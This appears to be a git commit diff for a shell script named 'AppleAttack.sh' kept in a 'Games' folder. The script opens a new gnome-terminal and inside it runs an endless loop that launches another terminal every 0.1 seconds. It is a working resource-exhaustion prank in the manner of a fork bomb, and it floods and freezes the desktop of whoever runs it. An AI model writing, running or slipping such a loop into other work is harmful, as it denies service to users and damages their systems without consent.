215ff328d3e06d30a4edbea905f769bfd00d5cff
Sunny <addrosity.yt@gmail.com>
2025-07-03 12:36:07 -0400

    Update AppleAttack.sh

--- Games/AppleAttack.sh
+++ Games/AppleAttack.sh
@@ -1,7 +1,9 @@
-#!/bin/sh
+#!/bin/bash
 
-while true
-do
+# Launch a new gnome-terminal that runs the loop script inline
+gnome-terminal -- bash -c '
+while true; do
   gnome-terminal &
   sleep 0.1
 done
+'
